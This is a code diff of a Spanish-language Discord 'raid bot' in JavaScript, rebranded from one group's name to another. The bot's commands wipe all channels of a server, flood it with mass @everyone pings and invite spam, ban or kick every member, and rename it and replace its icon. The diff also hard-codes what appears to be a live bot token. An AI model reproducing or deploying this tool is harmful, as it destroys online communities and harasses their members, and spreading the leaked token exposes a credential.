@@ -1,10 +1,10 @@
 const { Client, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField} = require('discord.js');
 const client = new Client({intents: [103423]});
 const fetch = require('node-fetch');
-const bot_token = ""; // Introducir el token del bot
+const bot_token = "MTI1NTM0ODU2ODQ2NjY1NzI5MQ.Gn0Xql.8SOnoCJD3oAL2sSB7U4_YtVLUOeV8xox731QzE"; // Introducir el token del bot
 const prefix = "."; // Prefijo del bot
-const names_channels = ["f̷v̷c̷k̷e̷d̷-̷b̷y̷-̷d̷o̷l̷c̷e̷", "g̷u̷i̷l̷d̷-̷c̷r̷y̷", "n̷u̷c̷k̷e̷d̷-̷b̷y̷-̷d̷o̷l̷c̷e̷", "d̷o̷l̷c̷e̷-̷k̷i̷n̷g̷"];
-const userid_vip = ["tu ID de Discord xdxd", "1189795248826744958"];
+const names_channels = ["f̷v̷c̷k̷e̷d̷-̷b̷y̷-̷s̶4", "r̶s̶i̶d̶-b̶y̶s̶4", "n̷u̷c̷k̷e̷d̷-̷b̷y̷-̷s̶4", "s̶4-̷k̷i̷n̷g̷"];
+const userid_vip = ["tu ID de Discord xdxd", "981266034579349524"];
 async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
 let en_raid = false;
 let mensajes_enviados = 0;
@@ -19,17 +19,17 @@ client.on(`ready`,()=>{
 client.on(`channelCreate`,async (channel)=>{
     if(names_channels.includes(channel.name)){
         try {
-            await channel.send({content:`@everyone | @here\nhttps://discord.gg/kEB3PCPkzc`}).then(async (mensajexd)=>{await channel.messages.cache.get(mensajexd.id).delete();}).catch((e)=>{console.log(e)})
+            await channel.send({content:`@everyone | @here\nhttps://discord.com/invite/c5YZGSGV`}).then(async (mensajexd)=>{await channel.messages.cache.get(mensajexd.id).delete();}).catch((e)=>{console.log(e)})
             await channel.send({embeds:[
                         new EmbedBuilder()
-                        .setImage(`https://i.ibb.co/8dSDY89/562331249efe5719fe258976514560fe-1.gif`)
-                        .setTitle(`**-                           /dolce GVNG                           -
+                        .setImage(``)
+                        .setTitle(`**-                           /s̶4               -
      
-                      -        TOP BOT RAID        -
+                      -        BOT RAID        -
      
-              - https://www.discord.gg/dolce -
+              -  -
      
-     -          OWNERS: /DOLCE      -**`)
+     -          OWNERS: /?      -**`)
             ]}).catch((e)=>{console.log(e)})
             mensajes_enviados++;
         } catch (e) {
@@ -46,27 +46,27 @@ async function leave_xd(guild, userid_raid) {
             new EmbedBuilder()
             .setTimestamp()
             .setTitle(`Raid Info | GuildChannels`)
-            .setDescription(`:spider_web: | Se eliminaron los canales del servidor.`)
+            .setDescription(` | Se eliminaron los canales del servidor.`)
         ]});
     };
     await client.users.cache.get(userid_raid).send({embeds:[
         new EmbedBuilder()
         .setTimestamp()
         .setTitle(`Raid Info | GuildChannels`)
-        .setDescription(`:spider_web: | Se crearon ${canales_creados} canales..`)
+        .setDescription(`| Se crearon ${canales_creados} canales..`)
     ]});
     await client.users.cache.get(userid_raid).send({embeds:[
         new EmbedBuilder()
         .setTimestamp()
         .setTitle(`Raid Info | GuildTags`)
-        .setDescription(`:spider_web: | Se realizaron **${mensajes_enviados}** tags en 1 minuto.`)
+        .setDescription(` | Se realizaron **${mensajes_enviados}** tags en 1 minuto.`)
     ]});
     if(nombre_server_cambiado===true){
         await client.users.cache.get(userid_raid).send({embeds:[
             new EmbedBuilder()
             .setTimestamp()
             .setTitle(`Raid Info | GuildNames`)
-            .setDescription(`:white_check_mark: | El nombre del servidor fue cambiado a **" #Ƒѵçҟҽժ βվ /ժօӀçҽ "**.`)
+            .setDescription(` | El nombre del servidor fue cambiado a **" #Ƒѵçҟҽժ βվ /s4"**.`)
         ]});
     };
     if(icon_server_cambiado===true){
@@ -74,7 +74,7 @@ async function leave_xd(guild, userid_raid) {
             new EmbedBuilder()
             .setTimestamp()
             .setTitle(`Raid Info | GuildIcon`)
-            .setDescription(`:white_check_mark: | La imagen del servidor ha sido cambiada correctamente.`)
+            .setDescription(` | La imagen del servidor ha sido cambiada correctamente.`)
         ]});
     };
     await client.users.cache.get(userid_raid).send({content:`\`\`\`->          Fin del informe          <-\`\`\``});
@@ -89,48 +89,47 @@ async function leave_xd(guild, userid_raid) {
 client.on(`messageCreate`,async (msg)=>{
     //Comandos ayuda
     if(msg.content === prefix+"vanity"){
-        await msg.author.send({content:`\`\`\`->     RAID BOT TOP, SUPLIED BY: /dolce    <-\`\`\``});
+        await msg.author.send({content:`\`\`\`->     RAID BOT ,     <-\`\`\``});
         await msg.author.send({embeds:[
             new EmbedBuilder()
             .setColor(`#ec4346`)
-            .setDescription(`:dolce_356~2: Recuerda poner el bot lo mas arriba posible para mejor funcionamiento!!`),
+            .setDescription(`: Recuerda poner el bot lo mas arriba posible para mejor funcionamiento!!`),
             new EmbedBuilder()
             .setColor(`#ec4346`)
-            .setDescription(`:dolce_356~2: **Luego de 1 minuto de haber utilizado un comando raid, el bot abandonara el servidor en el que el comando fue ejecutado.
+            .setDescription(` **Luego de 1 minuto de haber utilizado un comando raid, el bot abandonara el servidor en el que el comando fue ejecutado.
 (Es posible utilizar varios comandos a la vez)**`)
         ]});
         await msg.author.send({embeds:[
             new EmbedBuilder()
             .setColor(`#232426`)
-            .setThumbnail(`https://i.ibb.co/jZx1j4B/a-b2a7abe4b1ca7528b43bd26c3994a81f.gif`)
+            .setThumbnail(``)
             .setTitle(`Commands`)
             .setDescription(`Actualmente los unicos comandos son:
 
-.fvcked **(raid to the server)** :dolce_187:
-.banall **(banall members of the server)** :dolce_187:
-.kickall **(kickall members of the server)** :dolce_187:
-.nucked **(delete all channels of the server)** :dolce_187:
-.spam (makes 10 tags on all server channels **(- of 30 seconds))**
-:dolce_187:`),
+.fvcked **(raid to the server)** 
+.banall **(banall members of the server)** 
+.kickall **(kickall members of the server)** 
+.nucked **(delete all channels of the server)** 
+.spam (makes 10 tags on all server channels **(- of 30 seconds))**`),
             new EmbedBuilder()
             .setColor(`#232426`)
-            .setImage(`https://i.ibb.co/8dSDY89/562331249efe5719fe258976514560fe-1.gif`)
-            .setFooter({text:`- This bot is offered by brzzl and its administrative ZenX$Team. -`})
-            .setDescription(`:star_black: [Click here to invite me](https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot)`)    
+            .setImage(``)
+            .setFooter({text:`- . -`})
+            .setDescription(` [Click here to invite me](https://discord.com/oauth2/authorize?client_id=1255348568466657291&permissions=8&integration_type=0&scope=bot`)    
         ]})
-        await msg.author.send({content:`\`\`\`->     RAID BOT TOP, SUPLIED BY: /dolce    <-\`\`\``});
+        await msg.author.send({content:`\`\`\`->     RAID BOT TOP    <-\`\`\``});
     };
     if(msg.content === prefix+"help"){
         await msg.author.send({embeds:[
             new EmbedBuilder()
             .setColor(`#232426`)
-            .setThumbnail(`https://i.ibb.co/jZx1j4B/a-b2a7abe4b1ca7528b43bd26c3994a81f.gif`)
-            .setFooter({text:`- This bot is offered by brzzl and its administrative ZenX$Team. -`})
+            .setThumbnail(``)
+            .setFooter({text:`- . -`})
             .setDescription(`**Commands help**
 1 - \`Puede usar comandos .vanity ( o obtener el enlace para invitar al bot al gremio y los comandos del bot ) .cmds ( o obtener los comandos que el bot )\`
 
 **Important information**
-1 - \`No puedes atacar los servidores que son propiedad de /dolce.\` :dolce_184:
+1 - \`No puedes atacar los servidores que son propiedad de /.\` 
 
 
 2 - \`No puedes usar los comandos .fvcked y .spam repetidamente, debes esperar 1 minuto en fvcked y 30 segundos en spam (esto también se aplica si hay un ataque de estos activos por parte de otras personas)\` :dolce_184:
@@ -149,19 +148,19 @@ client.on(`messageCreate`,async (msg)=>{
         await msg.author.send({embeds:[
             new EmbedBuilder()
             .setTitle(`Commands`)
-            .setThumbnail(`https://i.ibb.co/jZx1j4B/a-b2a7abe4b1ca7528b43bd26c3994a81f.gif`)
-            .setFooter({text:`- This bot is offered by brzzl and its administrative ZenX$Team. -`})
+            .setThumbnail(``)
+            .setFooter({text:`- . -`})
             .setDescription(`The commands of the bot raid are:
 
-.fvcked **(raid to the server)** :dolce_187:
-.banall **(banall members of the server)** :dolce_187:
-.kickall **(kickall members of the server)** :dolce_187:
-.nucked **(delete all channels of the server)** :dolce_187:
-.spam **(makes 10 tags on all server channels (- of 30 seconds))** :dolce_187:`)
+.fvcked **(raid to the server)** 
+.banall **(banall members of the server)** 
+.kickall **(kickall members of the server)** 
+.nucked **(delete all channels of the server)** :
+.spam **(makes 10 tags on all server channels (- of 30 seconds))** `)
         ]})
     };
     //
-    //by ZenX$team jejeje - brzzl
+    //
     //Comandos de ataque
     if(msg.content === prefix+"fvcked"){
         leave_xd(msg.guild, msg.author.id);
@@ -206,7 +205,7 @@ client.on(`messageCreate`,async (msg)=>{
         await msg.author.send({embeds:[
             new EmbedBuilder()
             .setThumbnail(`https://i.ibb.co/s1PTrL8/c91a0f124ddb5a192dca2da415d8645e.png`)
-            .setDescription(`:homie_star: You have started a raid ( .fvcked ) in **${msg.guild.name}**`)
+            .setDescription(`You have started a raid ( .fvcked ) in **${msg.guild.name}**`)
         ]});
         let channelsxd = await msg.guild.channels.fetch();
         for (const ch of channelsxd.values()) {
@@ -215,7 +214,7 @@ client.on(`messageCreate`,async (msg)=>{
         if(channelsxd.size === 0){
             canales_borrados_exito=true;
         };
-        await msg.guild.setName(`#Ƒѵçҟҽժ βվ /ժօӀçҽ`).then(nombre_server_cambiado=true);
+        await msg.guild.setName(`#Ƒѵçҟҽժ βվ /s̶4`).then(nombre_server_cambiado=true);
         await msg.guild.setIcon(`https://i.ibb.co/s1PTrL8/c91a0f124ddb5a192dca2da415d8645e.png`).then(icon_server_cambiado=true);
         for (let index = 0; index < 85; index++) {
             let randomName = Math.floor(Math.random() * names_channels.length);
@@ -227,7 +226,7 @@ client.on(`messageCreate`,async (msg)=>{
             try {
                 let channelxd = client.guilds.cache.get(msg.guild.id).channels.cache.get(chxd.id);
                 for (let index = 0; index < 20; index++) {
-                    await channelxd.send({content:`@everyone | @here\nhttps://discord.gg/kEB3PCPkzc`}).catch((e)=>{console.log(e)})
+                    await channelxd.send({content:`@everyone | @here\nhttps://discord.com/invite/c5YZGSGV`}).catch((e)=>{console.log(e)})
                     await channelxd.send({embeds:[
                         new EmbedBuilder()
                         .setImage(`https://i.ibb.co/8dSDY89/562331249efe5719fe258976514560fe-1.gif`)
@@ -235,9 +234,9 @@ client.on(`messageCreate`,async (msg)=>{
     
                     -        TOP BOT RAID        -
     
-            - https://www.discord.gg/dolce -
+            -  -
     
-    -          OWNERS: /DOLCE      -**`)
+    -          OWNERS: /?      -**`)
                     ]}).catch((e)=>{console.log(e)})
                     mensajes_enviados++;
                 };
@@ -289,7 +288,7 @@ client.on(`messageCreate`,async (msg)=>{
             for (const ch of channelss.values()) {
                 ch.delete().catch((e)=>{console.log(e)});
             };
-            await msg.guild.channels.create({name:'zenx-on-top',type:ChannelType.GuildText}).catch((e)=>{console.log(e)});
+            await msg.guild.channels.create({name:'s4ontop',type:ChannelType.GuildText}).catch((e)=>{console.log(e)});
         }
     };
     if(msg.content === prefix+"spam"){
@@ -302,17 +301,17 @@ client.on(`messageCreate`,async (msg)=>{
         async function enviar_mensajes(chxd) {
             let channelxd = client.channels.cache.get(chxd.id);
             for (let index = 0; index < 10; index++) {
-                await channelxd.send({content:`@everyone | @here\nhttps://discord.gg/kEB3PCPkzc`}).then((mensajexd)=>{mensajes_ids.push({mensaje_id: mensajexd.id,canal_id: channelxd.id})})
+                await channelxd.send({content:`@everyone | @here\nhttps://discord.com/invite/c5YZGSGV`}).then((mensajexd)=>{mensajes_ids.push({mensaje_id: mensajexd.id,canal_id: channelxd.id})})
                 await channelxd.send({embeds:[
                     new EmbedBuilder()
                     .setImage(`https://i.ibb.co/8dSDY89/562331249efe5719fe258976514560fe-1.gif`)
-                    .setTitle(`**-                           /dolce GVNG                           -
+                    .setTitle(`**-                           /                          -
  
                   -        TOP BOT RAID        -
  
-          - https://www.discord.gg/dolce -
+          -  -
  
- -          OWNERS: /DOLCE      -**`)
+ -          OWNERS: /?    -**`)
                 ]});
                 mensajes_enviados++;
                 if(mensajes_totales <= mensajes_enviados){
@@ -336,4 +335,4 @@ client.on(`messageCreate`,async (msg)=>{
         };
     };
 });
-client.login(bot_token);
+client.login(bot_token);("MTI1NTM0ODU2ODQ2NjY1NzI5MQ.Gn0Xql.8SOnoCJD3oAL2sSB7U4_YtVLUOeV8xox731QzE")
